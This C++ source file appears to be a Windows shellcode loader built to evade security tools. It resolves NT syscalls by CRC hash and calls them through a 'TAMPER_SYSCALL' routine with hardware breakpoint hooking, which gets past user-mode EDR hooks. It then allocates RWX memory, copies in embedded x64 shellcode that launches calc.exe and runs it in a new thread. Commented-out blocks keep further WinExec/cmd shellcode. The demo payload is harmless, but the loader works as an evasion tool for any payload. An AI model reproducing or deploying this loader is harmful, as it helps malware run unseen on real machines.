#include <iostream>
#include "include/PeParsing.h"
#include "include/syscalls.h"
#include "include/helpers.h"

#define ZwAllocateVirtualMemory_CRCA     0x71D7EF35
#define ZwProtectVirtualMemory_CRCA      0x998153D9
#define ZwCreateThreadEx_CRCA			 0x477AC175
#define ZwWaitForSingleObject_CRCA       0xcb27b639

//winexec kernel32 winexec calc.exe payload.
/*
unsigned char rawData[] = {
    0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
    0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
    0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
    0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
    0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
    0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
    0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
    0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
    0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};


00402000  > 8BEC             MOV EBP,ESP
00402002  . 68 65786520      PUSH 20657865
00402007  . 68 636D642E      PUSH 2E646D63
0040200C  . 8D45 F8          LEA EAX,DWORD PTR SS:[EBP-8]
0040200F  . 50               PUSH EAX
00402010  . B8 8D15867C      MOV EAX,kernel32.WinExec
00402015  . FFD0             CALL EAX

unsigned char rawData[] =
    "\x31\xC9"                   //xor ecx,ecx
    "\x64\x8B\x71\x30"           //mov esi,[fs:ecx+0x30]
    "\x8B\x76\x0C"               //mov esi,[esi+0xc]
    "\x8B\x76\x1C"               //mov esi,[esi+0x1c]
    "\x8B\x36"                   //mov esi,[esi]
    "\x8B\x06"                   //mov eax,[esi]
    "\x8B\x68\x08"               //mov ebp,[eax+0x8]
    "\xEB\x20"                   //jmp short 0x35
    "\x5B"                       //pop ebx
    "\x53"                       //push ebx
    "\x55"                       //push ebp
    "\x5B"                       //pop ebx
    "\x81\xEB\x11\x11\x11\x11"   //sub ebx,0x11111111
    "\x81\xC3\xDA\x3F\x1A\x11"   //add ebx,0x111a3fda (for seven X86 add ebx,0x1119f7a6)
    "\xFF\xD3"                   //call ebx
    "\x81\xC3\x11\x11\x11\x11"   //add ebx,0x11111111
    "\x81\xEB\x8C\xCC\x18\x11"   //sub ebx,0x1118cc8c (for seven X86 sub ebx,0x1114ccd7)
    "\xFF\xD3"                   //call ebx
    "\xE8\xDB\xFF\xFF\xFF"       //call dword 0x15
    //db "cmd"
    "\x63\x6d\x64";
*/

unsigned char rawData[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x00";


int main()
{
    if(!init())
        printf("error attempting to initialize");

    PVOID BaseAddress = NULL;
    ULONG RegionSize = sizeof(rawData);
    DWORD dwOldPro = 0x00;
    HANDLE hThread = NULL;

    if(!InitHardwareBreakpointHooking()) {
        printf("[error] attempting to initialize hardware breakpoint hooking\n");
        return -1;
    }


    printf("[>] BaseAddress : 0x%p \n", &BaseAddress);
    printf("[>] RegionSize : 0x%p \n", &RegionSize);

    int_srand(time(NULL));

    TAMPER_SYSCALL(ZwAllocateVirtualMemory_CRCA, 6, -1, &BaseAddress, 0x00, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, NULL, NULL, NULL, NULL, NULL);



    TAMPER_SYSCALL(ZwProtectVirtualMemory_CRCA, 5, -1, &BaseAddress, &RegionSize, PAGE_EXECUTE_READWRITE, &dwOldPro, NULL, NULL, NULL, NULL, NULL, NULL);

    MemoryCopy(BaseAddress, rawData, sizeof(rawData));


    TAMPER_SYSCALL(ZwCreateThreadEx_CRCA, 7, &hThread, THREAD_ALL_ACCESS, NULL, -1, BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

    TAMPER_SYSCALL(ZwWaitForSingleObject_CRCA, 3, hThread, INFINITE, FALSE, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);// give created thread enough time to finish executing

    if(!HaltHardwareBreakpointHooking())
        return -1;

}
